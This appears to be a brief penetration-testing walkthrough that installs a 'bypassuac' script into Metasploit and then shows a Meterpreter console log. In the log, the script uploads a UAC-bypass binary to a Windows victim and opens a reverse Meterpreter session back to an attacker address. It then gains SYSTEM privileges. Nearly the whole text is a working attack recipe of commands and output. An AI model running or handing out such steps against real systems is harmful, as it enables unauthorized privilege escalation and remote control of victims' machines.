SIMPLE: copy the uac folder to your root msf directory and data/exploits/ so cp -rf uac/ /pentest/exploits/framework3/data/exploits/

next: copy bypassuac.rb /pentest/exploits/framework3/scripts/meterpreter

From meterpreter> shell, run bypassuac.

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter > run bypassuac
[*] Creating a reverse meterpreter stager: LHOST=172.16.32.128 LPORT=4546
[*] Running payload handler
[*] Uploading Windows UACBypass to victim machine.
[*] Bypassing UAC Restrictions on the system....
[*] Meterpreter stager executable 73802 bytes long
[*] Uploaded the agent to the filesystem....
[*] Executing the agent with endpoint 172.16.32.128:4546 with UACBypass in effect...
[*] C:\Users\dave-dev\AppData\Local\Temp\ULPLcpvueZu.exe /c %TEMP%\GCnkvZyVxv.exe
meterpreter > [*] Meterpreter session 2 opened (172.16.32.128:4546 -> 172.16.32.130:1594) at Fri Dec 31 21:45:47 -0500 2010

meterpreter >
Background session 1? [y/N]  y
msf exploit(handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getsystem
...got system (via technique 1).

